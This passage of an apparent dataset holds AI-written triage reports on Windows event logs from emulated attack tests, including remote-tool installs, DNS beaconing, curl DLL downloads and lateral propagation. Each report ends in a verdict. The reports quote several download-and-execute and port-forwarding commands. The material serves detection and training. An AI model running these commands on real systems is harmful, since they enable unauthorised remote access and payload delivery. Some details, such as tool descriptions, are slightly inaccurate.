- **Assessment**: The activities observed, particularly the PowerShell execution pattern and rapid sequential execution of system binaries, are suspicious and could be indicative of potential malicious activity. However, without additional context or system impact, this cannot conclusively be classified as malicious.
  
- **Recommendation**:
  - Conduct a thorough review and correlation of user activity related to the ""admin_test"" account to identify any unauthorized actions.
  - Investigate the purpose of the PowerShell usage and verify legitimacy, especially focusing on DNS query patterns.
  - Check for scheduled tasks or scripts executing ""wevtutil.exe"" and ""conhost.exe"" for legitimacy.
  - Consider isolating the system for further forensic analysis or engage a threat intelligence feed to assess the level of compromise.
  - Reinforce monitoring rules around sensitive administrative actions and process creations involving PowerShell and other critical system utilities.

**Resolution**: SUSPICIOUS - Further investigation is necessary to understand the intent and impact of the actions observed in the logs."
LogMeIn Files Detected Test on Windows,"### Detailed Analysis

#### Suspicious or Anomalous Behavior
1. **Privilege Usage**:
   - Event ID 4672 shows the ""admin_test"" user obtaining multiple high-level privileges, including `SeDebugPrivilege` and `SeImpersonatePrivilege`. These privileges are often targeted for malicious purposes, such as process injection or privilege escalation. While the use of these privileges by an administrative account can be normal, it warrants further scrutiny in context.

2. **PowerShell Execution**:
   - The PowerShell logs show that a script was run to download a file from the internet using `Invoke-WebRequest` and installed with `msiexec`. The command script:
     ```shell
     powershell.exe & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi 
     https://secure.logmein.com/LogMeInIgnition.msi; $file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""; 
     Start-Process -Wait $file1 /quiet; Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""}
     ```
     - This line of activity is unusual as it involves downloading and executing software without prior context.
     - LogMeIn Ignition is a legitimate remote management tool, but installing it via scripted PowerShell could indicate unauthorized remote access setup.

3. **Process Monitoring with Sysmon**:
   - There are multiple executions noted, such as `hostname.exe`, `whoami.exe`, which are typically used for information gathering purposes by attackers.
   - The presence of `LogMeInIgnition.exe` and `LMIGuardianSvc.exe` processes starting after the PowerShell script execution supports the suspicion of unwanted remote control software installation.

4. **System Service Modification**:
   - The System log indicates that the WebClient service start type was changed from ""demand start"" to ""auto start"". This could be benign but requires verification against administrative change logs.

#### Indication of Malicious Activity or Compromise
- The logs provide evidence of a script executing actions typical of malicious payload delivery used to download and install remote control software (LogMeIn). 
- Elevated privileges granted to the `admin_test` account highlight the risk of wider system compromise.
- While LogMeIn Ignition is a legitimate tool, its unsanctioned installation, combined with other markers, strongly suggests potential malicious activity.

### Final Assessment and Resolution
- **Resolution**: **MALICIOUS**
- The combination of downloading remote control software via a script, elevation of privileges, and starting processes associated with remote access points convincingly toward a potentially malicious context.

### Guidance on How to Proceed
1. **Immediate Containment and Analysis**:
   - Isolate the affected system from the network to prevent potential remote access by unauthorized users.
   - Review access logs to determine if remote access is actively occurring or has occurred.
2. **Investigate User Accounts and Permissions**:
   - Check the `admin_test` account for any unauthorized access patterns and further misuse of privileges.
   - Ensure that necessary security patches and updates are applied to prevent exploitation of system/software vulnerabilities.
3. **Thorough System Audit and Cleanup**:
   - Uninstall unsanctioned remote management software and review all installed software for legitimacy.
   - Conduct a comprehensive malware scan and remove detected threats.
4. **Strengthening Security Posture**:
   - Implement stricter PowerShell script execution policies, such as Code Signing.
   - Re-evaluate privilege assignments and reduce permissions to a principle of least privilege.
   - Ensure routine event log monitoring and anomaly detection practices are in place to catch similar events proactively."
Splashtop Execution,"Upon analyzing the provided Windows event logs, it appears that the main activity revolves around the installation and execution of software components related to ""Splashtop Personal"" and ""Microsoft Edge"". Here are the key observations and assessments:

### Application Log:
1. **MsiInstaller Events**:
   - Multiple logs indicate a successful installation of ""Splashtop Personal"". This software is legitimate and a known remote desktop application. The installation appears to have proceeded without errors.

2. **CAPI2 Event**:
   - Logs related to certificate enrollment with Go Daddy and Starfield Certification Authorities. This is common for legitimate applications obtaining/renewing certificates and doesn't immediately signal malicious activity.

### Security Log:
1. **Security Auditing Event**:
   - There is a log indicating process execution by ""Microsoft EdgeUpdate"", which is consistent with updating operations of Microsoft Edge. The presence of the ""Install"" subdirectory and setup.exe indicates a software update process, which appears legitimate and expected.

### Sysmon Log:
1. **Process Creation and Termination Events**:
   - Frequent execution and termination events of setup.exe files associated with both ""Splashtop Personal"" and ""Microsoft Edge"". The processes run with ""NT AUTHORITY\SYSTEM"", which is common for these installations.
   - Notably, multiple `powershell.exe` executions involved scripted actions starting processes, such as `strwinclt.exe`. While the use of PowerShell can sometimes indicate suspicious behavior, given the context of software installation, it is likely part of the installation process.

2. **Conhost and Cmd Execution**:
   - The execution of `conhost.exe` and `cmd.exe` processes are seen accompanying installation processes. These are typical in installations or script-driven software setups for managing console applications.

### Windows PowerShell Log:
- This log reveals PowerShell scripts related to the ""`Splashtop Personal`"" installation process. There are no signs of obfuscation or malicious script content observed.

### Assessment:
Based on the analysis, the activities logged in the event logs do not immediately signal malicious intent. The events primarily involve legitimate software installation and update processes related to Splashtop and Microsoft Edge, both well-known and widely used software.

### Final Resolution:
- **BENIGN**: The logs contain benign activity. The events observed are consistent with system maintenance tasks such as software installation and updates, and there are no clear indicators of compromise or malicious activity within the available data. 

To proceed, regular monitoring should continue, ensuring that security practices like patch management and endpoint protection are consistently followed to minimize any opportunity for malicious activity. If any suspicious behavior is detected outside the scope of these logs, further detailed investigation may be warranted."
DNS Regular Beaconing,"**Detailed Analysis of the Logs:**

Upon reviewing the provided logs, there are several aspects and entries that stand out and warrant further analysis:

1. **PowerShell Activity:**
   - The PowerShell log entries show the execution of a script located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\data-dns-beacon.ps1`. The script is executed with the following parameters: `-Domain 127.0.0.1.nip.io -Subdomain file -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30`.
   - This script execution resembles characteristics of a DNS-based beaconing script often used in malware for communication with command and control servers. Although the domain in use (`127.0.0.1.nip.io`) resolves back to the local machine (loopback), the use of such scripts and temporary file locations is suspicious, particularly if not expected in normal operations.

2. **System and Security Logs:**
   - There are entries reflecting time adjustments, indicated by both System and Security logs where `svchost.exe` modifies the system time. The reason provided for these changes (Event ID 4616 indicating Windows Time Service adjustments) is not inherently malicious, but if such adjustments are unexpected, they could be used to tamper with timestamps or log integrity.

3. **Sysmon Logs:**
   - The execution of `wevtutil.exe` (Console Window Host), an executable used to manage event logs, repeatedly shows up in the Sysmon logs. This can be concerning if these processes are not part of normal administrative tasks. If an attacker gains access, they may use such utilities to clear or tamper with logs to hide malicious activity.
   - The `whoami.exe` and `hostname.exe` executions are non-malicious utilities but frequent or scripted execution, particularly if automated, could denote unauthorized access checking environment details.

**Assessment:**

- **Suspicious PowerShell Activity:** The execution of `data-dns-beacon.ps1` is suspicious, particularly its execution in a temporary folder without a clear legitimate purpose.
- **Potential Log Tampering Indications:** The frequent usage of `wevtutil.exe` might indicate attempts to review or modify event logs.

**Resolution:**
Based on the suspicious PowerShell script execution and potential indicators of log tampering, I categorize this finding as **SUSPICIOUS**. Further investigation is warranted, including:
- Confirming if the PowerShell scripts are part of legitimate administrative activities.
- Reviewing file hashes and the contents of scripts executed.
- Investigating the motivation and context of the time changes in system logs.
- Checking for any unauthorized access patterns or abnormal user behavior.

**Guidance on How to Proceed:**
- Conduct a thorough review of the executed scripts, and consult with system administrators to verify if these activities were authorized.
- Check for any additional evidence of compromise, such as unauthorized network communications or abnormal file modifications.
- Consider isolating the affected machine (Server002) for detailed forensic analysis if further evidence points toward compromise.
- Implement additional monitoring and alerting if similar activities are detected in the future."
Curl Download File,"Upon analysis of the provided Windows event logs, several areas of interest were identified that suggest potential suspicious activities. Below is a detailed breakdown of the findings:

### Key Observations:

1. **Time Changes**:
    - Multiple events show discrepancies in the system time, changing backward then forward (Event ID 4616 in the Security log and Event ID 1 in the System log). This can sometimes indicate attempts to manipulate timestamps, possibly to cover malicious activity. However, it might also be benign if it aligns with typical system adjustments like time synchronization.

2. **Unexpected Network Activity / Download**:
    - Sysmon Event IDs 17980-17986 highlight the use of `cmd.exe` to execute `curl.exe` for downloading a DLL file from `https://github.com/file/file-file/raw/.../AllTheThingsx64.dll`. The repeated attempts and different download paths (e.g., C:\Users\Public\Music, C:\ProgramData, and Temp directory) strongly suggest malicious intent.

3. **Execution of PowerShell and System Utilities**:
    - Execution of programs like `powershell.exe`, `wevtutil.exe`, and `conhost.exe` observed in Sysmon logs without specified benign commands that sometimes accompany lateral movement or information gathering by attackers (e.g., `Sysmon EventID 5`, Process ID 1936, 2948, 3300, 3888, 4888).

4. **Use of System Utilities in Sequence**:
    - Frequent execution of `wevtutil.exe` and `conhost.exe`, especially chained with tools like `whoami.exe` and `hostname.exe`, indicates potential probing or task automation that might be unusual if not part of standard system management activities.

5. **Privileges and Integrity Levels**:
    - The processes executed under a high integrity level by a user named `SERVER002\admin_test`, indicating potential privileged actions were performed. If this account's activity doesn't match expected behavior, it suggests risk.

6. **Frequent Execution of Microsoft Edge Update**:
    - The EdgeUpdate service frequently installs or updates, which could be routine, but it is notable due to its occurrence with low-level processes (often these can be repurposed for lateral movement or persistence).

### Threat Assessment and Resolution:

- **Suspicious Activity**: The execution of `curl.exe` to download a DLL from an external site is highly indicative of suspicious or malicious behavior. It's crucial to verify this activity was legitimate or expected, perhaps as part of a software update or configuration management activity authorized within your organization.
- **Overall System Activity**: While there are benign explanations for time synchronization issues and EdgeUpdate frequent executions, these should be cross-referenced with any legitimate activity logs or maintenance schedules.

### Recommended Actions:

1. **Immediate Review**: 
   - Check if the downloaded `AllTheThingsx64.dll` is present on the system. If found, quarantine and analyze it for malicious code.
   - Review network logs concurrent with these events to check for additional suspicious traffic or unusual external communications.

2. **Account Review**:
   - Verify the `SERVER002\admin_test` account's activity across other systems.
   - Check for unauthorized or unexpected users and their privileges on the host.

3. **Log Events Cross-Check**: 
   - Confirm time changes and sysadmin activities against maintenance logs to rule out legitimate actions.

4. **Educate Users**: 
   - Inform teams on identifying phishing attempts and securing credentials, reducing chances of initial access through compromised accounts.

Based on these observations, the logs should be finalized as **SUSPICIOUS** due to the potential unauthorized download of a DLL which needs further investigation to confirm malicious activity."
Nimgrab - Transfer Files,"Based on the provided event logs, I will analyze the Sysmon events since the other logs are unavailable. Here's a breakdown of the observations and findings:

### Observations:
1. **PowerShell Execution:**
   - Event Record ID 17999 shows the execution of `powershell.exe` by the user `SERVER002\\admin_test`. While PowerShell can be used for legitimate administration tasks, it is also commonly abused for malicious activities. However, alone this entry doesn't indicate malicious activity without further context.

2. **Wevtutil.exe and Conhost.exe Executions:**
   - Multiple uses of `wevtutil.exe` and `conhost.exe` are noted. Wevtutil is used for managing Windows event logs, and while its presence is typical, excessive or unexplained usage might be suspicious. `conhost.exe` is often associated with console applications and thus might execute if command line operations are being performed.

3. **Host Processes (hostname.exe, whoami.exe):**
   - Execution of standard Windows utilities like `hostname.exe` and `whoami.exe` was noted. They are benign on their own but might raise a flag if executed in a pattern suggesting information gathering by a malicious actor (e.g., within a script).

4. **Suspicious Cmd.exe Usage:**
   - Event Record IDs 18029 and 18031 reveal the use of `cmd.exe` with a command line that downloads and executes a file (`nimgrab.exe`) from an external source (GitHub). This kind of activity is a strong indicator of potential malicious intent, particularly when files are downloaded from the internet and executed.

### Assessment:
The key element raising suspicion is the download and execution of `nimgrab.exe` using the command line. This activity is often associated with malicious intent, particularly if the executable is not a recognized business application or update.

File download with finger.exe on Windows,"### Log Analysis

Upon reviewing the provided logs, here are key observations:

#### Security Log Observations
1. **Event ID 4634**: Indicates a logoff from an account named `admin_test`. The logon type is 3 (Network), commonly used for accessing shared resources (file shares, etc.).
   
2. **Event ID 4672**: The user `admin_test` received special privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeDebugPrivilege`. These privileges imply an elevated level of access, potentially signaling administrative activities.

3. **Event ID 4624**: Represents successful logons for the `admin_test` account using NTLM authentication protocol. The logon types are 3 (Network), with connections originating from `DESKTOP-3HL5B2P` and an IPv6 address.

#### System Log Observations
1. **Event ID 1 & 24**: Involve minor changes or updates in the time settings which are generally legitimate system activities.

2. **Event ID 35**: Time synchronization with `time.windows.com`, a standard network time protocol source.

#### Sysmon Log Observations
1. Several instances of process executions related to `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE`, all executed by the `SERVER002\admin_test` user. While these processes themselves are not inherently malicious, the frequency and batch execution might suggest script or batch processing activities.

2. **Process ID 3128 (cmd.exe with ""finger"")**: The use of the `finger` command with a reference to `base64_filedata@localhost` seems highly suspicious as it could indicate an attempt to exfiltrate data or gain unauthorized access.

#### Application Log Observations
1. **edgeupdate events**: Log messages primarily indicate the stopping of `edgeupdate` services. No suspicious implications observed here.

### Suspicious Activities
- The combination of NTLM authenticated logins and assigned high privileges to the `admin_test` account, particularly with potential privilege escalation privileges, is worth further investigation, especially if this activity was not expected or known.
- The frequent use of legitimate system binaries (`wevtutil.exe` and `conhost.exe`) might be an attempt to leverage system utilities for undesired activities.
- The execution of `cmd.exe` with the specific command involving `finger` raises a red flag indicating possible malicious intent.

### Recommendations
- **Further Investigation**: Perform a deeper analysis of the `admin_test` account to confirm if the observed activities align with scheduled tasks or legitimate administrative scripts.
- **Network Traffic Inspection**: Investigate network traffic logs for unusual outbound connections that may correlate with the use of `finger` and network logins.
- **Audit and Alert Setup**: Set up alerts for the execution of potentially dangerous utilities like `wevtutil.exe` and commands using `finger` to detect potential threats in real-time.

### Conclusion
Considering the data and suspicious activities fingered in the logs:
- **Resolution**: **SUSPICIOUS**

The logs exhibit activity that is out of the norm and warrants a detailed investigation to rule out any malicious actions."
Steganographic Tarball Embedding,"### Detailed Analysis of Windows Event Logs:

#### Observations:
1. **Microsoft Edge Installer Activity:**
   - Multiple instances of `setup.exe` related to Microsoft Edge updates are seen executing processes with various command-line arguments.
   - All operations are carried out under the `NT AUTHORITY\SYSTEM` user context with `System` integrity level.
   - The command line arguments indicate typical activities related to updating and maintaining the software, such as `--msedge`, `--update-game-assist-package`, `--do-not-launch-msedge`, etc.

2. **Powershell Execution:**
   - There are events indicating PowerShell being executed by the user `SERVER002\admin_test`.
   - The command executed involves reading content from a file and writing content to another, possibly for data processing or conversion operations. This involves file operations on `data.002.jpg` and transformations to `data.002New.jpg`.

3. **Administrative Shell Processes:**
   - Execution of `hostname.exe`, `whoami.exe`, and `wsmprovhost.exe` is observed by the user `SERVER002\admin_test`.
   - These are standard Windows utilities and their usage in scripts or administrative contexts can be normal, particularly if used for visibility or environment context.

4. **Use of `wevtutil.exe`:**
   - The presence of `wevtutil.exe` processes (also run by `SERVER002\admin_test`) is a notable event. This tool is used for managing and querying event logs and can be part of malicious activities if an attacker is trying to investigate or clear logs.

#### Indicators of Potential Compromise:
- **PowerShell Script Execution:** The PowerShell invocation with commands to read and write data files might be legitimate automation tasks but can also be leveraged for malicious purposes if scripts modify payloads or exfiltrate data.
- **Use of `wevtutil.exe`:** Usage of tools like `wevtutil` by an administrative user at an unusual time might need further scrutiny to ensure event logs are not being tampered with.

### Assessment:
- **BENIGN Activity:**
  - No conclusive evidence suggests malicious intent or activity within the current logs.
  - The execution of Microsoft Edge installers aligns with legitimate application update and maintenance activities.

- **SUSPICIOUS Activity:**
  - The combination of ad-hoc PowerShell scripts manipulating data files and potential use of `wevtutil.exe` by an administrative user may warrant further investigation to verify intentions and contextual justification.

### Resolution:
- **SUSPICIOUS:**
  - Although no direct malicious activities are found, the presence of PowerShell operations reading from and writing to files in the context of user-level processes combined with `wevtutil.exe` calls raises potential red flags.
- **Recommendations:**
  - Further investigation is advised to verify the scripts executed via PowerShell and the context or reason for running `wevtutil.exe`.
  - Review user roles and permissions for `SERVER002\admin_test` to ensure actions align with legitimate user activities.
  - Cross-reference logs from other relevant timeframes and sources to corroborate findings and rule out post-execution alteration or tampering attempts."
MAZE Propagation Script,"Based on the provided logs, here is my detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - Several instances of PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by the user `SERVER002\admin_test` were noted. The command line executed indicates automated tasks intended to deploy and execute a file named `data.exe` across a network of machines.
   - The PowerShell script reads a list of machines from `dataMachineList.txt`, checks if each machine is online, copies `data.exe` to the target, and executes it using `regsvr32.exe`. This is highly suspicious as it resembles an attempt to distribute potentially malicious software across multiple systems.

2. **Wevtutil and Conhost Executions**:
   - Consistent with normal operations that may involve logging, but in context with other activities, could be used to manipulate or clean logs to hide illicit activities.

3. **Host and Whoami Execution**:
   - Use of commands like `hostname.exe` and `whoami.exe` typically involved in system reconnaissance aligns with potential malicious behavior, especially in the context of administrative-level operations.

### Indicators of Malicious Activity or Compromise:
- **PowerShell Script Execution**: The script includes indicators of lateral movement and remote code execution (leveraging `regsvr32.exe`).
- **Usage of `regsvr32.exe`**: Known for being utilized by attackers to execute code remotely by exploiting legitimate system tools, often used in attempts to bypass application whitelisting.

### Assessment of the Situation:
The logs disclose activity that strongly suggests malicious intent, particularly due to automated PowerShell operations aimed at distributing and executing potentially harmful files across multiple machines using administrative privileges.

### Identified Threats or Risks:
- **Lateral Movement & Code Execution**: The PowerShell script aims to connect to multiple systems in the network, implying an effort to propagate an executable file (`data.exe`), possibly malware.
- **Log Manipulation**: Could indicate an attempt to hide tracks by possibly editing or deleting logs.

### Guidance on How to Proceed:
1. **Immediate Containment**: Disconnect the affected system (Server002) from the network to prevent further execution of potentially harmful scripts or spreading of possibly malicious code.
2. **Forensic Analysis**: Conduct a deep forensic investigation on `Server002`. Analyze the contents of `data.exe` and its behavior post-execution.
3. **Alert Network Response Team**: Notify other teams to check for similar activities on other machines and monitor for further indicators of compromise.
4. **Audit Privileged Accounts**: Review and audit actions carried out by the `SERVER002\admin_test` account and all other privileged accounts for unauthorized activities.
5. **Update Security Rules**: Enhance detection measures for suspicious PowerShell activity, particularly for scripts involving network connections and use of administration-privilege actions.
6. **Review and Enhance Security Posture**: Analyze and improve security configurations and policies, especially focusing on PowerShell script execution policies.

### Final Resolution: MALICIOUS

The activities and tactics reflected in these logs align with common adversarial techniques seen in system compromises, particularly targeting Windows environments. They demonstrate behaviors typical of an attack campaign designed to expand influence across a network and potentially disrupt or steal data."
Arbitrary file download using the Notepad++ GUP.exe binary,"Based on the given event logs, I have performed an analysis to identify any suspicious or potentially malicious activity. Here's a summary of my findings:

### Observations:
1. **Microsoft Edge Update Execution:**
   - A series of logs indicate Microsoft Edge Update processes being executed, which is not inherently suspicious as they could be part of scheduled or automatic updates. However, these operations involve multiple instances of `MicrosoftEdgeUpdate.exe` with varying parameters that include `/update`, `/ping`, `/regsvc`, `/regserver`, and `/c`.
   - The Edge update process is running under `NT AUTHORITY\SYSTEM`, which is expected for system updates. The `CommandLine` arguments don't seem out of place for an update process, though further investigation about the timing and origin of this update is warranted.

2. **Use of Command Line:**
   - There's a `cmd.exe` process with a command line containing a sequence of operations: creating a directory, switching directories, and using an application called `GUP.exe` to unzip a file from a potentially external URL (http://getsamplefiles.com). This behavior is suspicious because:
     - It involves downloading files from an external source.
     - The zipped file action doesn't directly associate with typical user behavior or system updates.
   - The command is executed by the user `SERVER002\admin_test` who potentially has high privileges which could be leveraged maliciously.

3. **Execution of PowerShell and Other General Utilities:**
   - There are records indicating `PowerShell.exe`, `conhost.exe`, `wevtutil.exe`, and `whoami.exe` executions by the `SERVER002\admin_test` user.
   - The execution of `hostname.exe`, `whoami.exe`, and `wevtutil.exe` isn't inherently malicious but, in context with the above command line activities, might be used for reconnaissance or further script execution.

4. **Successive Execution of Processes:**
   - The logs contain successive executions of various processes in rapid succession which might indicate scripted automation—a common tactic in some cyber attack scenarios.

### Conclusion:
The activity described above does not clearly confirm a malicious action but presents several suspicious elements:
- Unexplained command-line usage to download and extract files from an unverified source.
- Lack of context around the necessity and timing of the PowerShell and various utility executions.

### Recommendation:
I recommend classifying this situation as **SUSPICIOUS** for the following reasons:
- The need to investigate why and by whom the command line operation involving `GUP.exe` was executed, especially the download from an external domain.
- Validate the legitimacy of the command-line operations and ensure they align with routine system maintenance or updates.
- Verify whether the Edge updates were authorized and sourced from a legitimate update server.

It would be prudent to perform a thorough review of the user activities for `SERVER002\admin_test` and confirm the origin and authenticity of the files downloaded and actions taken. Also, consider network traffic monitoring and malware scanning focused on the timeframe of these logs to rule out or identify further compromise."
ScreenConnect Application Download and Install on Windows,"### Detailed Analysis:

#### **1. Application Log:**
- **MsiInstaller Events:** Multiple events related to the installation of `ScreenConnect.msi` are observed. They indicate a typical MSI installation process, but the context in which this MSI is being installed should raise a red flag.
  
#### **2. Sysmon Log:**
- **Process Execution:** A PowerShell command is executed by the user `SERVER002\admin_test`, downloading an MSI file `ScreenConnect_21.11.4237.7885_Release.msi` from a non-standard URL (cloudfront.net) and installing it silently using `msiexec`. 
- **PowerShell Execution:** PowerShell is often used by adversaries to execute malicious code. The nature of the command and the silent installation signifies a level of stealthiness that could indicate a compromise.
- **Other Processes:** Legitimate Windows processes like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and `hostname.exe` are observed but do not exhibit malicious behavior by themselves apart from potentially being used to execute commands related to the installation event.

#### **3. Windows PowerShell Log:**
- The logs show details of the PowerShell script execution that installs the MSI file, confirming the activity observed in the Sysmon log. The command was used to perform network activity to download and execute the installer.

#### **4. System and Security Logs:**
- **Time Change Events:** There are events in both `System` and `Security` logs indicating a backward time change, which can be a tactic used by attackers to tamper with logs or evade detection mechanisms.

### Assessment:

The activity within these logs shows that a user (likely administrative) executed a PowerShell script to download and install `ScreenConnect.msi` from a remote URL without any user interaction (silent installation). ScreenConnect is a legitimate remote desktop software; however, it can be used for remote control or backdoors if installed without approval or awareness.

The inclusion of time-change events in both `System` and `Security` logs might indicate an attempt at evading log-tracking mechanisms, aligning with potential malicious intent.

Given:
- The use of PowerShell and silent installation tactics.
- The download from a non-standard URL.
- The potential unauthorized installation of remote control software.
- Time manipulation logs which are uncommon in typical scenarios.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
- **Immediate Investigation:** Check the source of the PowerShell script execution and determine if it was an authorized operation.
- **Audit User Activities:** Review activities of the user `SERVER002\admin_test` for any signs of credential misuse.
- **Verify the Installed Application:** Confirm if ScreenConnect was legitimately required and installed with consent.
- **Network Activity Review:** Analyze network logs for any unusual outbound connections, especially to the domain from which the MSI was downloaded.
- **Enforce Controls:** If unauthorized, block further downloads from the suspicious domain and apply stricter controls to PowerShell execution and MSI installations.
- **Remediation:** If confirmed malicious, isolate the server, conduct a thorough cleaning, and consider reinstalling the OS to remove any potential hidden compromises."
Lolbas replace.exe use to copy file,"Based on the provided logs:

1. **Overview and Context**:
   - The logs are specifically Sysmon logs, capturing process creation and termination events on `Server002`.
   - The primary user account involved is `SERVER002\admin_test`.
   - A notable absence of logs (Security, System, Windows PowerShell, Application) limits context but allows for process analysis through Sysmon logs.

2. **Patterns and Observations**:
   - Numerous executions involve legitimate Windows binaries such as `powersehll.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `replace.exe`.
   - Activities are consolidated around a specific timeframe, suggesting a batch operation or script.

3. **Potentially Anomalous Behavior**:
   - Use of `wevtutil.exe`: Often used by administrators, its frequent calls within seconds could indicate an attempt to tamper with log files.
   - Command-line of `cmd.exe`: The specific command `\""cmd.exe\"" /c del %%TEMP%%\\file.cab >nul 2>&1 & C:\\Windows\\System32\\replace.exe \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\file.cab\"" %%TEMP%% /A""` is questionable.
     - This type of command typically indicates file manipulation, suggesting data tampering or cleanup of temporary files where something might have been extracted or processed.

4. **Further Analysis Requiring Investigation**:
   - **`admin_test` Activity**: Need to ascertain whether `admin_test` should perform these tasks. If used within automation scripts or batch operations, this could be benign but unusual without context.
   - **`wevtutil.exe`**: Should verify the intent of these operations.
   - **Lack of Other Logs**: Security and other infrastructure used (AV logs, firewall logs) could elucidate suspicious behavior further.

5. **Assessment and Conclusion**:
   - Based on the patterns and aforementioned suspicious activities, although no conclusive evidence suggests malicious activity, these events warrant further examination to confirm legitimacy.
   - Suspicious operational patterns (wevtutil executions, specific cmd operations) necessitate caution and further validation.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Investigate the legitimacy of `admin_test` operations during the referenced period.
- Review `wevtutil.exe` activities for potential log tampering.
- Seek further context from absent logs or additional sources (e.g., user activity logs, network monitoring) to clarify these activities' intent.
- Escalate to obtain a thorough inspection with more complete data if malicious behavior is suspected."
portproxy reg key,"Upon detailed analysis of the provided event logs, I will present the findings by addressing potential anomalies or suspicious behavior that may indicate malicious activity.

### Observations:

1. **PowerShell Activity:**
   - Multiple events are recorded where PowerShell was executed with the following command line: `""powershell.exe & {netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1}""`.
   - This activity is notable as it sets up a port forwarding rule with `netsh`, mapping a local port (1337) to the same port on the loopback address. This creates a setting where any incoming connections to port 1337 on the system would be redirected internally.
   - Despite `PowerShell` being a legitimate tool, its use for network configurations like this, especially on port 1337, can be indicative of an attempt to establish a backdoor or a proxy channel, often seen in lateral movement or data exfiltration scenarios.

2. **Sysmon Logs:**
   - Several processes such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe` appear in conjunction with the user `SERVER002\admin_test`.
   - The execution of `whoami.exe` might be part of routine administrative tasks or scripts verifying the logged-in user's context, and similarly for `hostname.exe`. However, its presence in this timeline could be cross-related for further analysis.
   - The `netsh.exe` process was launched with a similar command line pattern as seen in PowerShell, reinforcing the suspicion around proxy setup activities.

3. **Application Logs:**
   - The event pertains to the `Software Protection Platform Service`, which is typical and doesn't inherently indicate malicious activity within this context but is a part of system maintenance within Windows environments.

4. **Security and System Logs:**
   - No entries were available to provide additional context from these logs.

### Assessment and Conclusion:

- **Suspicious Activity Identified:** 
   The repeated configuration of network proxy settings using PowerShell with potentially non-standard ports (1337) suggests deliberate attempts to modify network configurations, which is often a symptom of lateral movement or preparation for further intrusion activities.

- **Security Risk:** 
   The activity raises a potential risk of covert data channel establishment designed for persistence or unauthorized communication, potentially allowing further compromise of the host or sensitive data playback.

- **Resolution:** **SUSPICIOUS**

### Guidance and Next Steps:
1. **Immediate Investigation and Monitoring:** 
   - Investigate the origin of the command executions, including source scripts, tasks, or direct user interventions.
   - Review user activities and corroborate with access logs where available to identify unusual patterns or unauthorized access.

2. **Network and Endpoint Analysis:**
   - Monitor network traffic for unusual patterns associated with local port 1337 and prioritize verifying all established connections.
   - Undertake forensic analysis to capture process lineage, including inspecting affected endpoint configurations.

3. **Restrictive Measures:**
   - Consider implementing restriction policies that limit direct administrative PowerShell executions unless strictly necessary and auditable.
   - Validate and if unauthorized, remove the configured port proxy.

4. **User Security Awareness:**
   - Engage with the user identified in the logs to understand typical activities and assess potential social engineering targeting.

5. **Reporting and Documentation:**
   - Log the incident within your organization's incident management system for records and potential escalations to higher-level DFIR (Digital Forensics and Incident Response) teams if needed.

By handling the situation as suspicious, you can ensure thorough due diligence and mitigate any potential risks from unfolding into a full compromise."
Download a file with Microsoft Connection Manager Auto-Download,"Upon analyzing the provided Windows event logs, several points require careful consideration for potential indicators of compromise:

1. **Frequent Use of `wevtutil.exe`:** The logs demonstrate multiple instances of `wevtutil.exe` being executed by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility used to manage the Windows Event Log service and logs that it generates. The frequent execution of this utility may warrant further attention, especially if it was not part of routine administrative operations.

2. **PowerShell Execution:** The presence of PowerShell execution is noted in the logs via `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`. PowerShell is a powerful scripting tool often used by attackers for malicious purposes owing to its capabilities to perform system queries, execute commands, and interact with web services.

3. **Command Prompt with Scripts:** There is an instance where `cmd.exe` is executed with the argument to run a batch script located in a temporary directory. The command line `\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.bat\"" 1>NUL` could indicate the execution of a potentially harmful script, particularly because such scripts are often used to deploy malware.

4. **High Integrity Level:** Several processes executed under a high integrity level, implying high privileges. Not all such processes are suspicious, but it suggests the user `ADMIN_TEST` had elevated privileges, which malicious actors could exploit.

5. **Installation Processes:** Multiple events pertain to the installation and update of the Microsoft Edge browser. While this activity appears legitimate, if it was not authorized or expected, it could potentially mask malicious software installation or tampering.

### Assessment and Resolution:
- **BENIGN: Events involving the Microsoft Edge update**: This sequence of events appears to be related to legitimate software updates. Microsoft Edge regularly updates itself silently in the background as part of its normal operation.
  
- **SUSPICIOUS: Frequent execution of `wevtutil.exe` and scripts in temporary directories**: These activities could be part of normal system and application administrative tasks. However, they might also suggest a potential for abuse if they were not part of regular operations, especially without corresponding documentation or expected behavior from system administrators.

- **Resolution:** **SUSPICIOUS**
  
### Guidance on How to Proceed:
1. **Verification:** Reach out to the IT operations team or system administrators to confirm whether the observed wevtutil executions and script activities align with known maintenance tasks or troubleshooting activities.

2. **Review Integrity and Admin Activity:** Investigate `admin_test` account activity, including login patterns, and verify any changes to user privileges. Ensure that the elevated privilege commands align with authorized actions.

3. **Audit Logging:** Enable detailed logging for PowerShell, command-line utilities, and any script execution to capture more information on the invoked commands presumably involved in administrative tasks.

4. **Threat Intelligence and Virus Scans:** Use threat intelligence services and perform antivirus/malware scans to ensure the system has not been compromised by sophisticated means that may have evaded initial detection.

5. **Continuous Monitoring:** Implement continuous monitoring with alerts for irregular activities involving the tools utilized here like PowerShell, `wevtutil.exe`, and command execution within temporary directories.

These measures should help determine if the activities are legitimate or part of unauthorized access."
NetSupport - RAT Execution,"**Detailed Analysis of Logs:**

Upon reviewing the provided logs, several observations stand out indicating unusual activity:

